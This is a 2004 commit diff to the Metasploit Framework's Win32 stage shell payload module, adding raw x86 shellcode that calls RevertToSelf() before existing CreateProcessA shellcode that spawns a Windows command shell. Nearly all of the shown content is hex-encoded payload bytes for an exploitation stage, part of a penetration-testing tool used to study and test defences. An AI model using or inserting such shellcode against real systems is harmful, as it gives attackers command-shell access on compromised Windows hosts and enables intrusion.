ee54733918d45f0e43dc93339f5de5f7285dee61
HD Moore <hd_moore@rapid7.com>
2004-08-06 00:20:40 +0000

    RevertToSelf() added to stage shell

--- lib/Msf/PayloadComponent/Win32ShellStage.pm
+++ lib/Msf/PayloadComponent/Win32ShellStage.pm
@@ -10,8 +10,14 @@ my $info =
     # win32 specific code
     'Win32StagePayload' =>
     {
-        Offsets => { EXITFUNC => [103, 'V'] },
-        Payload =>        
+        Offsets => { EXITFUNC => [103+28, 'V'] },
+        Payload =>       
+        
+        # RevertToSelf()
+        "\xe8\x09\x00\x00\x00\x41\x44\x56\x41\x50\x49\x33\x32\x00\xff\x55". 
+        "\x08\x50\x68\x2a\xc8\xde\x50\xff\x55\x04\xff\xd0".
+
+        # CreateProcessA()
         "\x68\x43\x4d\x44\x00\x89\xe3\x87\xfa\x31\xc0\x8d\x7c\x24\xac\x6a".
         "\x15\x59\xf3\xab\x87\xfa\x83\xec\x54\xc6\x44\x24\x10\x44\x66\xc7".
         "\x44\x24\x3c\x01\x01\x89\x7c\x24\x48\x89\x7c\x24\x4c\x89\x7c\x24".
@@ -30,3 +36,6 @@ sub new {
   my $self = $class->SUPER::new($hash, @_);
   return($self);
 }
+
+1;
+
